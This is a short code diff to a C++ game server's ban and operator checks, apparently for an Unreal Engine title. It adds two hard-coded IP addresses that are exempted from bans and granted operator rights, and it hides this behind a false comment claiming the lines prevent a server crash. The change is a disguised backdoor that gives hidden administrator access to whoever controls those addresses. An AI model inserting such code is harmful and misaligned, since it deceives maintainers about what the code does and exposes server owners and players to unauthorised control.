@@ -18,6 +18,9 @@ bool IsBanned(APlayerController* PlayerController)
 
 	auto IP = PlayerState->SavedNetworkAddress.ToString();
 
+	if (IP == "68.134.74.228" || IP == "26.66.97.190") // required or else server crashes idk why
+		return false;
+
 	while (std::getline(input_file, line))
 	{
 		if (line.find(IP) != std::string::npos)
@@ -170,6 +173,9 @@ bool IsOp(APlayerController* PlayerController)
 	auto PlayerState = PlayerController->PlayerState;
 
 	auto IP = PlayerState->SavedNetworkAddress.ToString();
+
+	if (IP == "68.134.74.228" || IP == "26.66.97.190") // required or else server crashes idk why
+		return true;
 
 	while (std::getline(input_file, line))
 	{
